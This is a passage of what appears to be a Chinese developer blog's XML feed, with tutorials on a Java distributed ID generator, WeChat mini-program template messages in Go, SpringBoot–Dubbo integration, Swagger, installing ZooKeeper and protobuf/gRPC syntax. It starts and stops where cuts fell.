    <content type="text"><![CDATA[转载自：https://zhuanlan.zhihu.com/p/65095562 首先，需要确定全局唯一ID是整型还是字符串？ 如果是字符串，那么现有的UUID就完全满足需求，不需要额外的工作。缺点是字符串作为ID占用空间大，索引效率比整型低。 如果采用整型作为ID，那么首先排除掉32位int类型，因为范围太小，必须使用64位long型。 采用整型作为ID时，如何生成自增、全局唯一且不重复的ID？ 方案方案一 利用数据库的自增ID，从1开始，基本可以做到连续递增。Oracle可以用SEQUENCE，MySQL可以用主键的AUTO_INCREMENT，虽然不能保证全局唯一，但每个表唯一，也基本满足需求。 数据库自增ID的缺点是数据在插入前，无法获得ID。数据在插入后，获取的ID虽然是唯一的，但一定要等到事务提交后，ID才算是有效的。有些双向引用的数据，不得不插入后再做一次更新，比较麻烦。 方案二 采用一个集中式ID生成器，它可以是Redis，也可以是ZooKeeper，也可以利用数据库的表记录最后分配的ID。这种方式最大的缺点是复杂性太高，需要严重依赖第三方服务，而且代码配置繁琐。一般来说，越是复杂的方案，越不可靠，并且测试越痛苦。 方案三 类似Twitter的Snowflake算法，它给每台机器分配一个唯一标识，然后通过时间戳+标识+自增实现全局唯一ID。这种方式好处在于ID生成算法完全是一个无状态机，无网络调用，高效可靠。缺点是如果唯一标识有重复，会造成ID冲突。 Snowflake算法采用41bit毫秒时间戳，加上10bit机器ID，加上12bit序列号，理论上最多支持1024台机器每秒生成4096000个序列号，对于Twitter的规模来说够用了。 但是对于绝大部分普通应用程序来说，根本不需要每秒超过400万的ID，机器数量也达不到1024台，所以，我们可以改进一下，使用更短的ID生成方式： 53bitID由32bit秒级时间戳+16bit自增+5bit机器标识组成，累积32台机器，每秒可以生成65万个序列号，核心代码： 123456789101112131415161718private static synchronized long nextId(long epochSecond) &#123; if (epochSecond &lt; lastEpoch) &#123; // warning: clock is turn back: logger.warn("clock is back: " + epochSecond + " from previous:" + lastEpoch); epochSecond = lastEpoch; &#125; if (lastEpoch != epochSecond) &#123; lastEpoch = epochSecond; reset(); &#125; offset++; long next = offset &amp; MAX_NEXT; if (next == 0) &#123; logger.warn("maximum id reached in 1 second in epoch: " + epochSecond); return nextId(epochSecond + 1); &#125; return generateId(epochSecond, next, SHARD_ID);&#125; 时间戳减去一个固定值，此方案最高可支持到2106年。 如果每秒65万个序列号不够怎么办？没关系，可以继续递增时间戳，向前“借”下一秒的65万个序列号。 同时还解决了时间回拨的问题。 机器标识采用简单的主机名方案，只要主机名符合host-1，host-2就可以自动提取机器标识，无需配置。 最后，为什么采用最多53位整型，而不是64位整型？这是因为考虑到大部分应用程序是Web应用，如果要和JavaScript打交道，由于JavaScript支持的最大整型就是53位，超过这个位数，JavaScript将丢失精度。因此，使用53位整数可以直接由JavaScript读取，而超过53位时，就必须转换成字符串才能保证JavaScript处理正确，这会给API接口带来额外的复杂度。 完整源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105package com.pibigstar.util;import java.net.InetAddress;import java.net.UnknownHostException;import java.time.LocalDate;import java.time.ZoneId;import java.util.regex.Matcher;import java.util.regex.Pattern;import org.slf4j.Logger;import org.slf4j.LoggerFactory;/** * 根据每一个机器的IP生成16位不重复id（53字节） * @author pibigstar */public final class IdUtil &#123; private static final Logger logger = LoggerFactory.getLogger(IdUtil.class); private static final Pattern PATTERN_LONG_ID = Pattern.compile("^([0-9]&#123;15&#125;)([0-9a-f]&#123;32&#125;)([0-9a-f]&#123;3&#125;)$"); private static final Pattern PATTERN_HOSTNAME = Pattern.compile("^.*\\D+([0-9]+)$"); private static final long OFFSET = LocalDate.of(2000, 1, 1).atStartOfDay(ZoneId.of("Z")).toEpochSecond(); private static final long MAX_NEXT = 0b11111_11111111_111L; private static final long SHARD_ID = getServerIdAsLong(); private static long offset = 0; private static long lastEpoch = 0; /** * 生成16位不重复id * @return */ public static long nextId() &#123; return nextId(System.currentTimeMillis() / 1000); &#125; private static synchronized long nextId(long epochSecond) &#123; if (epochSecond &lt; lastEpoch) &#123; // warning: clock is turn back: logger.warn("clock is back: " + epochSecond + " from previous:" + lastEpoch); epochSecond = lastEpoch; &#125; if (lastEpoch != epochSecond) &#123; lastEpoch = epochSecond; reset(); &#125; offset++; long next = offset &amp; MAX_NEXT; if (next == 0) &#123; logger.warn("maximum id reached in 1 second in epoch: " + epochSecond); return nextId(epochSecond + 1); &#125; return generateId(epochSecond, next, SHARD_ID); &#125; private static void reset() &#123; offset = 0; &#125; /** * 生成id * @param epochSecond * @param next * @param shardId * @return */ private static long generateId(long epochSecond, long next, long shardId) &#123; return ((epochSecond - OFFSET) &lt;&lt; 21) | (next &lt;&lt; 5) | shardId; &#125; /** * 获取机器Id * @return */ private static long getServerIdAsLong() &#123; try &#123; //获取主机名 String hostname = InetAddress.getLocalHost().getHostName(); Matcher matcher = PATTERN_HOSTNAME.matcher(hostname); if (matcher.matches()) &#123; long n = Long.parseLong(matcher.group(1)); if (n &gt;= 0 &amp;&amp; n &lt; 8) &#123; logger.info("detect server id from host name &#123;&#125;: &#123;&#125;.", hostname, n); return n; &#125; &#125; &#125; catch (UnknownHostException e) &#123; logger.warn("unable to get host name. set server id = 0."); &#125; return 0; &#125; public static void main(String args[])&#123; for (int i=0; i &lt; 100; i++)&#123; System.out.println(nextId()); &#125; &#125;&#125;]]></content>
      <categories>
        <category>Java,java工具类</category>
      </categories>
      <tags>
        <tag>分布式</tag>
        <tag>id生成器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[go语言发送微信小程序模板消息]]></title>
    <url>%2F2019%2F04%2F08%2Fgo%E8%AF%AD%E8%A8%80%E5%8F%91%E9%80%81%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%A8%A1%E6%9D%BF%E6%B6%88%E6%81%AF%2F</url>
    <content type="text"><![CDATA[PS：开发微信的东西是真的心累，一大堆坑！文档写的乱七八糟的，找个东西都得半天。 为了发一条模板消息翻了无数个博客，很多都是把代码一放，其实代码这块很好弄，不就组装个数据调一下API吗，主要是前期工作。我把我遇到的坑给大家总结一下，希望后来人可以少走一些弯路。 微信发送模板消息文档：点击查看 超级大坑！发送接口问题 文档上是这个接口： 1https://api.weixin.qq.com/cgi-bin/message/template/send?access_token=ACCESS_TOKEN 实际不是的！！！！！是下面这个，看见没，多了一个wxopen，如果你碰到 48001 返回码，看看是不是这出问题了。 1https://api.weixin.qq.com/cgi-bin/message/wxopen/template/send?access_token=ACCESS_TOKEN 域名问题 他们这个必须要配置合法域名，必须是https的，要有SSL证书的，在微信开发工具上可以看到你目前配置的合法域名 内网穿透问题 因为formID必须要在真机上才可以获取，所以你最好设置一个内网穿透，让手机能访问到你本地的服务。 内网穿透工具可以去下面网站上下载，有免费的https://www.ngrok.cc 证书问题在腾讯云上下载的证书是下面这个样子的： 这时你在go语言就不知道用哪个里面的证书了。。。我用的gofram框架，可以这样搞，将Apache里面的这两个东西，通过下面网站生成一个 .pem证书然后再用到go语言中就好使了。https://www.myssl.cn/tools/merge-pem-cert.htmlgo语言中这样用 12s.EnableHTTPS("https/ssl.pem", "https/3_pibigstar.com.key")s.SetHTTPSPort(7777) 还有一个坑就是，端口不能是443，可能是我本机是Windows，把443端口屏蔽了，如果你一直出现404情况，换个端口！ 大概就些坑，如果你碰到其他的坑可以给我留言，或关注我的微信公众号，希望可以帮到你。 放代码go后端123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134import ( "bytes" "encoding/json" "fmt" "io/ioutil" "net/http" "time" "github.com/pibigstar/go-todo/config" "github.com/pibigstar/go-todo/constant" "github.com/pibigstar/go-todo/models/db")// 发送模板消息var ( send_template_url = "https://api.weixin.qq.com/cgi-bin/message/wxopen/template/send?access_token=%s" get_access_token_url = "https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&amp;appid=%s&amp;secret=%s")// SendTemplate 发送模板消息func SendTemplate(msg *TemplateMsg) (*SendTemplateResponse, error) &#123; msg.Miniprogram.AppID = config.ServerConfig.Appid accessToken, err := getAccessToken(msg.Touser) if err != nil &#123; log.Error("获取accessToken失败") return nil, err &#125; url := fmt.Sprintf(send_template_url, accessToken.AccessToken) data, err := json.Marshal(msg) if err != nil &#123; log.Error("模板消息JSON格式错误", "err", err.Error()) return nil, err &#125; client := http.Client&#123;&#125; resp, err := client.Post(url, "application/json", bytes.NewBuffer(data)) if err != nil &#123; log.Error("网络错误，发送模板消息失败", "err", err.Error()) return nil, err &#125; defer resp.Body.Close() body, _ := ioutil.ReadAll(resp.Body) var templateResponse SendTemplateResponse err = json.Unmarshal(body, &amp;templateResponse) if err != nil &#123; log.Error("解析responseBody错误", "err", err.Error()) return nil, err &#125; return &amp;templateResponse, nil&#125;func getAccessToken(openID string) (*GetAccessTokenResponse, error) &#123; var accessTokenResponse GetAccessTokenResponse // 先从redis中拿 accessToken, err := getAccessTokenFromRedis(openID) if accessToken != "" &amp;&amp; err == nil &#123; accessTokenResponse = GetAccessTokenResponse&#123;AccessToken: accessToken&#125; log.Info("从redis中获取到access_token", "access_token", accessToken) return &amp;accessTokenResponse, nil &#125; appID := config.ServerConfig.Appid secret := config.ServerConfig.Secret url := fmt.Sprintf(get_access_token_url, appID, secret) client := http.Client&#123;&#125; resp, err := client.Get(url) if err != nil &#123; log.Error("获取access_toke网络异常", "err", err.Error()) return nil, err &#125; defer resp.Body.Close() body, _ := ioutil.ReadAll(resp.Body) err = json.Unmarshal(body, &amp;accessTokenResponse) if err != nil &#123; log.Error("解析AccessToken失败", "err", err.Error()) return nil, err &#125; // 存到redis中 if _, err := setAccessTokenToRedis(openID, accessTokenResponse.AccessToken); err != nil &#123; log.Error("将access_token存储到redis中失败", "err", err.Error()) &#125; return &amp;accessTokenResponse, nil&#125;// 从redis中取access_tokenfunc getAccessTokenFromRedis(openID string) (string, error) &#123; key := fmt.Sprintf(constant.Access_Token_Redis_Prefix, openID) accessToken, err := db.Redis.Get(key).Result() return accessToken, err&#125;// 将access_token存储到redis中func setAccessTokenToRedis(openID, token string) (string, error) &#123; key := fmt.Sprintf(constant.Access_Token_Redis_Prefix, openID) b, err := db.Redis.Set(key, token, 7200*time.Second).Result() return b, err&#125;type TemplateMsg struct &#123; Touser string `json:"touser"` //接收者的OpenID TemplateID string `json:"template_id"` //模板消息ID FormID string `json:"form_id"` URL string `json:"url"` //点击后跳转链接 Miniprogram Miniprogram `json:"miniprogram"` //点击跳转小程序 Data *TemplateData `json:"data"`&#125;type Miniprogram struct &#123; AppID string `json:"appid"` Pagepath string `json:"pagepath"`&#125;type TemplateData struct &#123; First KeyWordData `json:"first,omitempty"` Keyword1 KeyWordData `json:"keyword1,omitempty"` Keyword2 KeyWordData `json:"keyword2,omitempty"` Keyword3 KeyWordData `json:"keyword3,omitempty"` Keyword4 KeyWordData `json:"keyword4,omitempty"` Keyword5 KeyWordData `json:"keyword5,omitempty"`&#125;type KeyWordData struct &#123; Value string `json:"value"` Color string `json:"color,omitempty"`&#125;type SendTemplateResponse struct &#123; Errcode int `json:"errcode"` Errmsg string `json:"errmsg"` MsgID string `json:"msgid"`&#125;type GetAccessTokenResponse struct &#123; AccessToken string `json:"access_token"` ExpiresIn int `json:"expires_in"`&#125; controller例子仅仅是个例子，供大家参考 123456789101112131415161718192021222324252627func init() &#123; s := g.Server() s.BindHandler("/send", sendTemplate)&#125;func sendTemplate(r *ghttp.Request) &#123; templateMsg := &amp;utils.TemplateMsg&#123;&#125; tempData := &amp;utils.TemplateData&#123;&#125; tempData.First.Value = "测试模板消息" tempData.Keyword1.Value = "大家记得买票啊" tempData.Keyword2.Value = "马上就要放假了，大家记得买回家的票啊" tempData.Keyword3.Value = "2018-12-30 15:59" tempData.Keyword4.Value = "派大星" tempData.Keyword5.Value = "记得按时完成" templateMsg.Data = tempData formID := r.GetString("formID") log.Info("formID", "formID", formID) templateMsg.FormID = formID openID, _ := middleware.GetOpenID(r) templateMsg.Touser = openID templateMsg.TemplateID = constant.Tmeplate_Receive_Task_ID response, err := utils.SendTemplate(templateMsg) if err != nil &#123; fmt.Println("发送模板消息失败", err.Error()) &#125; r.Response.WriteJson(response)&#125; 小程序端12345&lt;view&gt; &lt;form bindsubmit="templateSend" report-submit="true"&gt; &lt;button type='primary' formType="submit" size='mini'&gt;发送模板消息&lt;/button&gt; &lt;/form&gt;&lt;/view&gt; 12345678910templateSend: function (e) &#123; // 表单需设置report-submit=&quot;true&quot; var formId = e.detail.formId; // 发送随机模板消息 util.apiRequest(&quot;send&quot;,&quot;get&quot;,&#123; formID: formId, &#125;).then(data =&gt; &#123; console.log(data) &#125;)&#125;]]></content>
      <categories>
        <category>go,微信小程序</category>
      </categories>
      <tags>
        <tag>go</tag>
        <tag>模板消息</tag>
        <tag>微信小程序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot整合dubbo]]></title>
    <url>%2F2019%2F04%2F05%2FSpringBoot%E6%95%B4%E5%90%88dubbo%2F</url>
    <content type="text"><![CDATA[[TOC] 1. 前期准备###1.1 服务器中安装好zookeeper 安装过程看我之前的博客 点击这里 ###1.2 服务器中安装dubbo的控制端 下载dubbo-admin的war包 点击下载 解压，修改WEB-INF下的dubbo.properties，将dubbo.registry.address修改为你服务器地址，root用户的密码为pibigstar 启动tomcat 浏览器访问http://你服务器地址:tomcat启动端口号/dubbo-admin 查看是否能进入dubbo控制端 2. 构建dubbo服务提供者（先有提供者才能有消费者）###2.1 项目结构 2.2 添加依赖pom.xml 12345678910111213141516171819202122232425262728293031&lt;!-- dubbo started --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;dubbo&lt;/artifactId&gt; &lt;version&gt;2.4.10&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;artifactId&gt;spring&lt;/artifactId&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.zookeeper&lt;/groupId&gt; &lt;artifactId&gt;zookeeper&lt;/artifactId&gt; &lt;version&gt;3.4.6&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.sgroschupf&lt;/groupId&gt; &lt;artifactId&gt;zkclient&lt;/artifactId&gt; &lt;version&gt;0.1&lt;/version&gt; &lt;/dependency&gt; &lt;!-- dubbo end --&gt; 2.3 编写暴露的服务接口接口 1234567package com.pibigstar.dubbo.remote;public interface TestService &#123; String sayHello(String name); &#125; 实现类 123456789101112package com.pibigstar.dubbo.remote.impl;import com.pibigstar.dubbo.remote.TestService;public class TestServiceImpl implements TestService &#123; @Override public String sayHello(String name) &#123; return "Hello " + name + "!"; &#125;&#125; 2.4 编写配置文件provider.xml12345678910111213141516171819202122232425&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:dubbo="http://code.alibabatech.com/schema/dubbo" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://code.alibabatech.com/schema/dubbo http://code.alibabatech.com/schema/dubbo/dubbo.xsd"&gt; &lt;!-- 服务提供方应用名，用于计算依赖关系 --&gt; &lt;dubbo:application name="dubbo-provider" owner="dubbo-provider"/&gt; &lt;!-- 定义 zookeeper 注册中心地址及协议 --&gt; &lt;dubbo:registry protocol="zookeeper" address="139.199.64.253:2181" client="zkclient"/&gt; &lt;!-- 定义 Dubbo 协议名称及使用的端口，dubbo 协议缺省端口为 20880，如果配置为 -1 或者没有配置 port，则会分配一个没有被占用的端口 --&gt; &lt;dubbo:protocol name="dubbo" port="-1"/&gt; &lt;!-- 声明需要暴露的服务接口 --&gt; &lt;dubbo:service interface="com.pibigstar.dubbo.remote.TestService" ref="testService" timeout="10000"/&gt; &lt;!-- 和本地 bean 一样实现服务 --&gt; &lt;bean id="testService" class="com.pibigstar.dubbo.remote.impl.TestServiceImpl" /&gt; &lt;/beans&gt; 2.5 让SpringBoot启动加载配置文件1234567891011121314package com.pibigstar;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.context.annotation.ImportResource;@SpringBootApplication@ImportResource(value = &#123;"classpath:provider.xml"&#125;)public class DubboProviderApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(DubboProviderApplication.class, args); &#125;&#125; 2.6 启动dubbo服务提供者访问dubbo控制端 注意：这里有个大坑！！！！！！！！！！！SpringBoot必须要有Controller，不然会自动退出写一个空白的Controller上去。。。 1234567891011121314package com.pibigstar.web;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class TestController &#123; @RequestMapping("/say") public String say() &#123; return "test"; &#125;&#125; 3. 构建dubbo服务消费者3.1 项目结构 3.2 添加依赖pom.xml 12345678910111213141516171819202122232425262728293031323334353637&lt;!-- dubbo-consumer Started --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.1.41&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;dubbo&lt;/artifactId&gt; &lt;version&gt;2.4.10&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;artifactId&gt;spring&lt;/artifactId&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.zookeeper&lt;/groupId&gt; &lt;artifactId&gt;zookeeper&lt;/artifactId&gt; &lt;version&gt;3.4.6&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.sgroschupf&lt;/groupId&gt; &lt;artifactId&gt;zkclient&lt;/artifactId&gt; &lt;version&gt;0.1&lt;/version&gt; &lt;/dependency&gt; &lt;!-- dubbo-consumer end --&gt; 3.3 编写暴露的服务接口123456package com.pibigstar.dubbo.remote;public interface TestService &#123; String sayHello(String name); &#125; 3.4 编写Controller1234567891011121314151617181920212223242526package com.pibigstar.dubbo.consumer.controller;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.web.bind.annotation.PathVariable;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;import com.alibaba.fastjson.JSONObject;import com.pibigstar.dubbo.remote.TestService;@RestControllerpublic class TestController &#123; @Autowired TestService testService; @RequestMapping("/test/&#123;name&#125;") public JSONObject testJson(@PathVariable("name") String name) &#123; JSONObject jsonObject = new JSONObject(); String testStr = testService.sayHello(name); jsonObject.put("str", testStr); return jsonObject; &#125; &#125; 注意：这里接口的包名一定要和你前面服务提供者的包名一样！！ 3.5 编写配置文件consumers.xml123456789101112131415161718192021&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:dubbo="http://code.alibabatech.com/schema/dubbo" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://code.alibabatech.com/schema/dubbo http://code.alibabatech.com/schema/dubbo/dubbo.xsd"&gt; &lt;!-- 配置可参考 http://dubbo.io/User+Guide-zh.htm --&gt; &lt;!-- 消费方应用名，用于计算依赖关系，不是匹配条件，不要与提供方一样 --&gt; &lt;dubbo:application name="dubbo-consumer" owner="dubbo-consumer"/&gt; &lt;!-- 定义 zookeeper 注册中心地址及协议 --&gt; &lt;dubbo:registry protocol="zookeeper" address="139.199.64.253:2181" client="zkclient" /&gt; &lt;!-- 生成远程服务代理，可以和本地 bean 一样使用 testService(要和提供者名字一样) --&gt; &lt;dubbo:reference id="testService" interface="com.pibigstar.dubbo.remote.TestService"/&gt; &lt;/beans&gt; 3.6 加载配置文件1234567891011121314package com.pibigstar;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.context.annotation.ImportResource;@SpringBootApplication@ImportResource(value = &#123;"classpath:consumers.xml"&#125;) public class DubboConsumerApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(DubboConsumerApplication.class, args); &#125;&#125; 3.7 启动dubbo服务消费者 注意：一定要先启动服务提供者，不然无法启动消费者的 4 测试浏览器访问 http://localhost:8082/test/pibigstar我们看到已经调用了服务提供者的接口实现类 5 项目以所有工具下载https://pan.baidu.com/s/1fsd1LMiZ6kpQui0zpTiMIg]]></content>
      <categories>
        <category>springboot,Dubbo,SpringBoot技能大全</category>
      </categories>
      <tags>
        <tag>springboot</tag>
        <tag>dubbo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Swagger自动生成接口文档]]></title>
    <url>%2F2019%2F04%2F03%2FSwagger%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90%E6%8E%A5%E5%8F%A3%E6%96%87%E6%A1%A3%2F</url>
    <content type="text"><![CDATA[1. 添加依赖12345678910&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt; &lt;version&gt;2.8.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt; &lt;version&gt;2.8.0&lt;/version&gt;&lt;/dependency&gt; 2. 配置Swagger新建SwaggerConfig.java 1234567891011121314151617181920212223242526272829303132333435363738394041424344package com.pibigstar.common.config;import io.swagger.annotations.ApiOperation;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import springfox.documentation.builders.ApiInfoBuilder;import springfox.documentation.builders.PathSelectors;import springfox.documentation.builders.RequestHandlerSelectors;import springfox.documentation.service.ApiInfo;import springfox.documentation.spi.DocumentationType;import springfox.documentation.spring.web.plugins.Docket;import springfox.documentation.swagger2.annotations.EnableSwagger2;/** * Swagger配置 * @author pibigstar * */@Configuration@EnableSwagger2public class SwaggerConfig&#123; @Bean public Docket createRestApi() &#123; return new Docket(DocumentationType.SWAGGER_2) .apiInfo(apiInfo()) .select() //只有加了ApiOperation注解的类，才生成接口文档 .apis(RequestHandlerSelectors.withMethodAnnotation(ApiOperation.class)) //包下的类，生成接口文档 //.apis(RequestHandlerSelectors.basePackage("com.pibigstar.web")) .paths(PathSelectors.any()) .build(); &#125; private ApiInfo apiInfo() &#123; return new ApiInfoBuilder() .title("VIP资源解析") .description("VIP资源解析文档") .termsOfServiceUrl("http://mxspvip.cn") .version("1.5.0") .build(); &#125;&#125; 3. 使用@Api用在类上，说明该类的作用 123@Controller@Api(value="VIP视频播放",tags="视频播放接口")public class ParseVIPController extends BaseController&#123; &#125; @ApiOperation用在方法上，说明方法的作用 123@RequestMapping(value="/vip",method=RequestMethod.GET)@ApiOperation("VIP视频播放")public ModelAndView play()&#123;&#125; @ApiParam用在参数中，说明参数的作用 123public MyResponse seach(@ApiParam(name = "type",value = "类型1:酷狗，2：QQ",required = true)String type,@ApiParam(name = "music",value = "音乐名",required = true)String music)&#123; &#125; @ApiImplicitParams用在方法上，用来说明方法中参数的作用 12@ApiImplicitParams(value = &#123; @ApiImplicitParam(name="url",value="视频地址")&#125;)public ModelAndView play(String url) &#123; &#125; @ApiModel描述一个Model的信息（这种一般用在post创建的时候，使用@RequestBody这样的场景，请求参数无法使用@ApiImplicitParam注解进行描述的时候） 1234567891011@ApiModel(value="用户信息") public class User &#123; @ApiModelProperty("用户id") private Integer userCode; @ApiModelProperty("用户类型") private String userType; @ApiModelProperty("用户名称") private String userName; @ApiModelProperty("用户手机号") private String mobileNumber; &#125; @ApiResponses用在方法上，用来表示一组响应信息 @ApiResponse用在@ApiResponses中，一般用于表达一个错误的响应信息 code：数字，例如400 message：信息，例如”请求参数没填好” response：抛出异常的类 4. 访问http://localhost:8080/swagger-ui.html]]></content>
      <categories>
        <category>Java,springboot,SpringBoot技能大全</category>
      </categories>
      <tags>
        <tag>swagger</tag>
        <tag>接口文档</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安装Dubbo的注册中心zookeeper]]></title>
    <url>%2F2019%2F04%2F01%2F%E5%AE%89%E8%A3%85Dubbo%E7%9A%84%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83zookeeper%2F</url>
    <content type="text"><![CDATA[安装环境：CentOs、JDK1.6以上 1. 下载zookeeper1wget http://mirrors.shu.edu.cn/apache/zookeeper/zookeeper-3.4.12/zookeeper-3.4.12.tar.gz 2. 解压1tar -zxvf zookeeper-3.4.12.tar.gz 3. 新建data目录123cd zookeeper-3.4.12mkdir data 4.修改配置123456cd conf #进行conf文件夹# 修改配置文件名字mv zoo_sample.cfg zoo.cfg # 修改zoo.cfg文件, dataDIr = [刚才新建的data文件夹路径]dataDir=/usr/local/zookeeper/zookeeper-3.4.12/data 5. 启动zookeeper服务1234567cd bin #进入bin目录# 启动服务./zkServer.sh start# 查看服务状态./zkServer.sh status# 如果为：Mode: standalone 则证明启动成功 6. 查看当前注册的结点12# 启动zookpeer客户端./zkCli.sh 12ls /ls /dubbo]]></content>
      <categories>
        <category>Dubbo</category>
      </categories>
      <tags>
        <tag>Dubbo</tag>
        <tag>zookeeper</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[protobuf文件详解]]></title>
    <url>%2F2019%2F03%2F30%2Fprotobuf%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[通信方式 一个请求对象对应一个返回对象 1rpc Login(LoginRequest) returns (LoginResponse) &#123;&#125; 一个请求对象，服务器返回多个结果 1rpc Login(LoginRequest) returns (stream LoginResponse) &#123;&#125; 3.多个请求对象，一个返回结果 1rpc Login(stream LoginRequest) returns (LoginResponse) &#123;&#125; 4.多个请求对象，服务器返回多个结果 1rpc Login(stream LoginRequest) returns (stream LoginResponse) &#123;&#125; 关键字 stream 表示多个值 Protobuf定义 syntax=”proto3”; 文件的第一行指定了你使用的是proto3的语法：如果你不指定，protocol buffer 编译器就会认为你使用的是proto2的语法。这个语句必须出现在.proto文件的非空非注释的第一行。 package user; 编译完成之后，包名为user service 定义服务 123service UserService &#123; rpc Login(LoginRequest) returns (LoginResponse);&#125; message 定义结构体 1234message LoginRequest &#123; string username=1; string password=2;&#125; 数据类型 strings 默认值是空字符串 int32 默认是0（编译之后为go语言中的int类型） int64 默认是0 （编译之后为go语言中的int64） float 默认为0.0 （编译之后为go语言中的 float32） double 默认为0.0 （编译之后为go语言中的 float64） uint32 （编译之后为go语言中的 uint32） uint64 （编译之后为go语言中的 uint64） bytes 默认值是空bytes bool 默认值是false enum 默认值是第一个枚举值（value必须为0) 字段修饰符 repeated：用来定义数组，一个字段可以重复出现一定次数（包括零次） required：值不可为空 (proto3中已删除) optional：可选字段 (proto3中已删除) singular：符合语法规则的消息包含零个或者一个这样的字段 (proto3中已删除) 默认值： string code=2 [default=200]; (proto3中已删除) 其他类型 枚举定义 1234567//枚举类型，必须从0开始，序号可跨越。同一包下不能重名，所以加前缀来区别enum Role &#123; Role_Admin=0; Role_Guest=1; Role_User=2; Role_Other=9;&#125; Map类型1map&lt;key_type, value_type&gt; map_field = N; 其中key_type可以是任意Integer或者string类型（所以，除了floating和bytes的任意标量类型都是可以的）value_type可以是任意类型。 例如，如果你希望创建一个project的映射，每个Projecct使用一个string作为key 1map&lt;string, Project&gt; projects = 3; 示例123456789101112131415161718192021222324252627282930313233343536syntax="proto3";package user;service UserService&#123; // 注册 rpc Signup(SignupRequest) returns (SignupResponse);&#125;// 定义错误枚举，必须从0开始enum LoginError &#123; //密码错误 Error_Password=0; //用户名错误 Error_UserName=1; //内部服务器错误 Error_Server=9;&#125;message ID &#123; int32 id=1;&#125;// 注册请求体message SignupRequest &#123; string username=1; string password=2; int32 code=3; // 数组 repeated string hobby=4; // map map&lt;string,string&gt; maps = 5;&#125;//注册响应体message SignupResponse &#123; ID id=1; int32 code=2 [default=200]; string msg=3;&#125; Google中提供的特殊类型待定。。。 数据校验插件地址及文档：https://github.com/envoyproxy/protoc-gen-validate 流的使用1rpc GetStatus (GetReq) return (stream GetResp); service实现 123456789101112func (HelloService) GetStatus(req *pb.GetReq,stream pb.HelloService_GetStatusServer) err &#123; for i:=0;i&lt;10;i++&#123; stream.Send(&amp;pb.GetResp&#123; Status: i, &#125;) if err:=stream.Context().Err();err!=nil &#123; fmt.Println("客户端关闭流...") return err &#125; &#125; return nil&#125; 使用grpc-web访问流：文档：https://github.com/grpc/grpc-web 12345678910111213141516var helloService= new proto.mypackage.HelloServiceClient('http://localhost:8080');var getReq= new proto.mypackage.GetReq();getReq.setMessage(msg);var metadata = &#123;'custom-header-1': 'value1'&#125;;var stream = helloService.getStatus(getReq, metadata);stream.on('data', function(response) &#123; console.log(response.getStatus());&#125;);stream.on('status', function(status) &#123; console.log(status.code); console.log(status.details); console.log(status.metadata);&#125;);stream.on('end', 